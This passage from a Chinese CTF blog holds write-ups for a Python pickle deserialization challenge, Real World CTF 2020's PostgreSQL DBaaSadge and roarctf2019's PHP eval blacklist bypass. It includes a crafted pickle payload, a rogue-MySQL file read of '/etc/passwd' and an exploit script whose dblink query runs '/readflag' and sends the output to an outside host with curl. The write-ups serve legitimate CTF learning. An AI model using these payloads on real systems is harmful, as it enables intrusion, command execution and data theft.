+ user.group)</span><br><span class="line">        user.privileged = <span class="literal">False</span></span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = <span class="built_in">input</span>(<span class="string">&#x27;$ &#x27;</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&#x27;pysh: &#x27;</span> + req + <span class="string">&#x27;: command not found&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Available commands: &#x27;</span> + <span class="string">&#x27; &#x27;</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_whoami</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Not Implemented QAQ&quot;</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;flag: Permission denied&#x27;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">bytes</span>(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> <span class="built_in">zip</span>(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br></pre></td></tr></table></figure>



<p>如果我们想拿到flag,要么命令执行直接拿flag要么就令<code>user.privileged=True</code> 调用cmd_flag来拿flag</p>
<p>但是再反序列化处</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;Login as &#x27;</span> + user.name + <span class="string">&#x27; - &#x27;</span> + user.group)</span><br><span class="line">      user.privileged = <span class="literal">False</span></span><br></pre></td></tr></table></figure>

<p><code>user.privileged</code>会被覆盖为False,再康康其他的信息把</p>
<p><code>dir(structs)</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[<span class="string">&#x27;User&#x27;</span>, <span class="string">&#x27;__builtins__&#x27;</span>, <span class="string">&#x27;__cached__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__file__&#x27;</span>, <span class="string">&#x27;__loader__&#x27;</span>, <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__package__&#x27;</span>, <span class="string">&#x27;__spec__&#x27;</span>]</span><br></pre></td></tr></table></figure>

<hr>
<p>几个小时后,看wp学成归来.</p>
<p>我:艹,太骚了,师傅们牛逼死了</p>
<hr>
<p>之前说有两个解题思路,命令执行这一个思路在看了一会之后就觉得不太行,毫无头绪</p>
<p>再康康让<code>user.privileged=False</code>失效这一思路,emmmm感觉也不太行.</p>
<p>但是,类的赋值肯定会受到一些特殊函数的影响</p>
<p>在研究类的赋值的时候可以找到<a target="_blank" rel="noopener" href="https://foofish.net/what-is-descriptor-in-python.html">描述符</a>可以自定义赋值函数</p>
<p>那么如果我们能让User的<code>__set__</code>变成一个接受3个参数的函数,就可以令<code>user.privileged=False</code>无效</p>
<p>但是很显然pickle里是无法直接编写代码的,令<code>__set__=&quot;&quot;</code>?更不行,会直接报错</p>
<p>继续阅读代码我们会发现一个神奇的东西</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, name, group</span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;name:%s ,group:%s&quot;</span>%(name,group))</span><br></pre></td></tr></table></figure>

<p><code>User.__init__</code>刚好接受三个参数</p>
<p>我们能不能让<code>__set__=User</code>?,然后调用<code>__set__</code>的时候调用<code>User.__init__</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(User,<span class="string">&#x27;test&#x27;</span>,User(<span class="number">123</span>,<span class="number">123</span>))</span><br><span class="line">name:<span class="number">123</span> ,group:<span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">setattr</span>(User,<span class="string">&quot;__set__&quot;</span>,User)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b=User(<span class="number">123</span>,<span class="number">123</span>)</span><br><span class="line">name:<span class="number">123</span> ,group:<span class="number">123</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>b.test=<span class="number">123123</span></span><br><span class="line">name:&lt;structs.User <span class="built_in">object</span> at <span class="number">0x0000017BA1538748</span>&gt; ,group:<span class="number">123123</span></span><br></pre></td></tr></table></figure>



<p>于是构造:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="built_in">__import__</span>(<span class="string">&quot;structs&quot;</span>).User</span><br><span class="line">b=User(<span class="string">&quot;123&quot;</span>,<span class="string">&quot;456&quot;</span>)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&quot;privileged&quot;</span>,b)</span><br><span class="line"><span class="built_in">setattr</span>(a,<span class="string">&quot;__set__&quot;</span>,a)</span><br><span class="line"><span class="keyword">return</span> b</span><br></pre></td></tr></table></figure>

<p>对应的pickle代码为</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(S&quot;123&quot;</span><br><span class="line">S&quot;456&quot;</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(N&#125;S&#x27;privileged&#x27;</span><br><span class="line">g101</span><br><span class="line">sS&#x27;__set__&#x27;</span><br><span class="line">g100</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure>



<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ help</span><br><span class="line">Available commands: help whoami su flag</span><br><span class="line">$ whoami</span><br><span class="line">123 456</span><br><span class="line">$ flag</span><br><span class="line">b&#x27;Balsn&#123;pY7h0n1dae_ObJ3c7&#125;\n&#x27;</span><br></pre></td></tr></table></figure>

<p>hhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhhh</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p> <a target="_blank" rel="noopener" href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a> </p>
<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/188981">https://www.anquanke.com/post/id/188981</a> </p>
<p> <a target="_blank" rel="noopener" href="http://www.polaris-lab.com/index.php/archives/178/">http://www.polaris-lab.com/index.php/archives/178/</a> </p>
<p> <a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a> </p>
<p> <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5306">https://xz.aliyun.com/t/5306</a> </p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/pickle/" data-id="cku8j3fi3005sdan77buhgb94" data-title="python  pickle 入门" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-real world ctf 2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/real%20world%20ctf%202020/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/real%20world%20ctf%202020/">real world ctf 2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="Real-World-CTF-2020"><a href="#Real-World-CTF-2020" class="headerlink" title="Real World CTF 2020"></a>Real World CTF 2020</h1><p>比赛很棒，题目很好，我很菜</p>
<h2 id="DBaaSadge"><a href="#DBaaSadge" class="headerlink" title="DBaaSadge"></a>DBaaSadge</h2><p>就一个PostgreSQL任意语句执行，给的权限不是superuser，但大部分操作是能进行的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$sql</span>=(<span class="keyword">string</span>)<span class="variable">$_GET</span>[<span class="string">&quot;sql&quot;</span>])&#123;</span><br><span class="line">  show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header(<span class="string">&#x27;Content-Type: text/plain&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen(<span class="variable">$sql</span>)&gt;<span class="number">100</span>)&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;That query is too long ;_;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!pg_pconnect(<span class="string">&#x27;dbname=postgres user=realuser&#x27;</span>))&#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;DB gone ;_;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$query</span> = pg_query(<span class="variable">$sql</span>))&#123;</span><br><span class="line">  print_r(pg_fetch_all(<span class="variable">$query</span>));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="keyword">die</span>(<span class="string">&#x27;._.?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>题目提供了docker文件</p>
<p>看下Dockerfile发现：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">安装了postgresql-10-mysql-fdw</span><br><span class="line">还开启了dblink</span><br></pre></td></tr></table></figure>

<p>相关的介绍文章：</p>
<p><a target="_blank" rel="noopener" href="https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/">https://www.percona.com/blog/2018/08/21/foreign-data-wrappers-postgresql-postgres_fdw/</a></p>
<p><a target="_blank" rel="noopener" href="https://www.postgresql.org/docs/10/contrib-dblink-function.html">https://www.postgresql.org/docs/10/contrib-dblink-function.html</a></p>
<p>一个是远程连接mysql，一个是远程连接postgresql 。</p>
<p>mysql客户端有个非常有名的漏洞：<code>Load data local infile &#39;/etc/passwd&#39; into table proc;</code>，即客户端文件读取，利用<a target="_blank" rel="noopener" href="https://github.com/allyshka/Rogue-MySql-Server">https://github.com/allyshka/Rogue-MySql-Server</a> 搭建一个恶意mysql服务端成功读取到文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#x27;ccreater.top&#x27;,port&#x27;63306&#x27;)</span><br><span class="line">CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#x27;a&#x27;, password &#x27;a&#x27;);</span><br><span class="line">CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#x27;a&#x27;,table_name &#x27;a&#x27;)</span><br><span class="line">select * from c</span><br></pre></td></tr></table></figure>

<p>结合dblink很自然的想到读取postgress数据库存储文件获得superuser密码再任意命令执行</p>
<p>通过本地搭建环境获得数据库文件位置：/var/lib/postgresql/10/main/base</p>
<p>已查找一下postgresql为关键词查找文件得到密码所在文件：</p>
<p><code>/var/lib/postgresql/10/main/global/1260</code></p>
<p>查找一下postgresql的加密规则：md5(password+username)</p>
<p>exp.py</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">sqls=[</span><br><span class="line">      <span class="string">&quot;CREATE SERVER q FOREIGN DATA WRAPPER mysql_fdw OPTIONS(host&#x27;ccreater.top&#x27;,port&#x27;63306&#x27;)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;CREATE USER MAPPING FOR realuser SERVER q OPTIONS (username &#x27;a&#x27;, password &#x27;a&#x27;)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;CREATE FOREIGN TABLE c (id int)SERVER q OPTIONS(dbname &#x27;a&#x27;,table_name &#x27;a&#x27;)&quot;</span>,</span><br><span class="line">      <span class="string">&quot;select * from c&quot;</span></span><br><span class="line">]</span><br><span class="line">sqls=[</span><br><span class="line">      <span class="string">&quot;select dblink(&#x27;host=0 password=jpr5q&#x27;,&#x27;copy(select)to program&#x27;&#x27;curl y5pwcd.ceye.io/`/readflag`&#x27;&#x27;&#x27;)&quot;</span></span><br><span class="line">]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack</span>(<span class="params">sql</span>):</span></span><br><span class="line">      burp0_url = <span class="string">&quot;http://54.219.197.26:60080/&quot;</span></span><br><span class="line">      burp0_headers = &#123;<span class="string">&quot;Pragma&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Cache-Control&quot;</span>: <span class="string">&quot;no-cache&quot;</span>, <span class="string">&quot;Upgrade-Insecure-Requests&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;User-Agent&quot;</span>: <span class="string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36&quot;</span>, <span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&quot;</span>, <span class="string">&quot;Accept-Encoding&quot;</span>: <span class="string">&quot;gzip, deflate&quot;</span>, <span class="string">&quot;Accept-Language&quot;</span>: <span class="string">&quot;zh-CN,zh;q=0.9&quot;</span>, <span class="string">&quot;Connection&quot;</span>: <span class="string">&quot;close&quot;</span>&#125;</span><br><span class="line">      r= requests.get(burp0_url, headers=burp0_headers,params=&#123;</span><br><span class="line">            <span class="string">&quot;sql&quot;</span>:sql</span><br><span class="line">      &#125;)</span><br><span class="line">      <span class="built_in">print</span>(r.text)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> sql <span class="keyword">in</span> sqls:</span><br><span class="line">      hack(sql)</span><br></pre></td></tr></table></figure>

<p>rwctf{pop_cat_says_p1ea5e_upd4t3_youR_libmysqlclient_kekW}</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2021/10/01/real%20world%20ctf%202020/" data-id="cku8j3fi4005vdan78hus9qpf" data-title="real world ctf 2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-roarctf2019" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2021/10/01/roarctf2019/" class="article-date">
  <time class="dt-published" datetime="2021-10-01T15:35:42.676Z" itemprop="datePublished">2021-10-01</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2021/10/01/roarctf2019/">roarctf2019</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="roarctf2019"><a href="#roarctf2019" class="headerlink" title="roarctf2019"></a>roarctf2019</h1><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="easycalc"><a href="#easycalc" class="headerlink" title="easycalc"></a>easycalc</h3><h4 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$str</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line">        <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>,<span class="string">&#x27;\$&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;\^&#x27;</span>];</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$str</span>)) &#123;</span><br><span class="line">                        <span class="keyword">die</span>(<span class="string">&quot;what are you want to do?&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$str</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>





<h4 id="解法一-肝就完事"><a href="#解法一-肝就完事" class="headerlink" title="解法一 肝就完事"></a>解法一 肝就完事</h4><p>强行绕过限制</p>
<p>关键:<code>((10000000000000).(0))&#123;3&#125;</code>=&gt;E</p>
<p>python脚本</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">arr=&#123;</span><br><span class="line">    <span class="string">&quot;0&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((0).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;1&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((1).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;2&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((2).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;3&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((3).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;4&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((4).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;5&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((5).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;6&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((6).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;7&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((7).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;8&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((8).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;9&quot;</span>:<span class="string">&#x27;&#x27;&#x27;((9).(0))&#123;0&#125;&#x27;&#x27;&#x27;</span>,</span><br><span class="line">    <span class="string">&quot;-&quot;</span>: <span class="string">&quot;((-1).(0))&#123;0&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.&quot;</span> :<span class="string">&quot;((1.1).(0))&#123;1&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;E&quot;</span>: <span class="string">&quot;((10000000000000000000).(1))&#123;3&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;p&quot;</span>:<span class="string">&quot;((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;$&quot;</span>:<span class="string">&quot;((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;l&quot;</span>:<span class="string">&quot;((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))|(~((0).(0))&#123;0&#125;)&amp;~((~((8).(0))&#123;0&#125;)&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;H&quot;</span>: <span class="string">&quot;(~((0).(0))&#123;0&#125;)&amp;~((~((8).(0))&#123;0&#125;)&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Z&quot;</span> : <span class="string">&quot;(~(((((-1).(0))&#123;0&#125;)&amp;(((4).(0))&#123;0&#125;))))&amp;(~((~(((8).(0))&#123;0&#125;))&amp;((~(((2).(0))&#123;0&#125;))&amp;(~(((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;v&quot;</span> :<span class="string">&quot;(((2).(0))&#123;0&#125;)|((~((1).(0))&#123;0&#125;)&amp;((10000000000000000000).(1))&#123;3&#125;)&quot;</span>,</span><br><span class="line">    <span class="string">&quot;D&quot;</span> :<span class="string">&quot;(~((1).(0))&#123;0&#125;)&amp;((10000000000000000000).(1))&#123;3&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;A&quot;</span> :<span class="string">&quot;(~((2).(0))&#123;0&#125;)&amp;(~((~((1).(0))&#123;0&#125;)&amp;(~((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;)))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;P&quot;</span> :<span class="string">&quot;(~((1.1).(0))&#123;1&#125;)&amp;((((10000000000000000000).(1))&#123;3&#125;)&amp;(~(((1).(7))&#123;1&#125;)|(((1).(0))&#123;1&#125;))|(((1).(0))&#123;1&#125;))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;O&quot;</span> :<span class="string">&quot;(~((0).(0))&#123;0&#125;)&amp;(~((~((8).(0))&#123;0&#125;)&amp;((~((2).(0))&#123;0&#125;)&amp;(~((10000000000000000000).(1))&#123;3&#125;))))&quot;</span>,</span><br><span class="line">    <span class="string">&quot;S&quot;</span> :<span 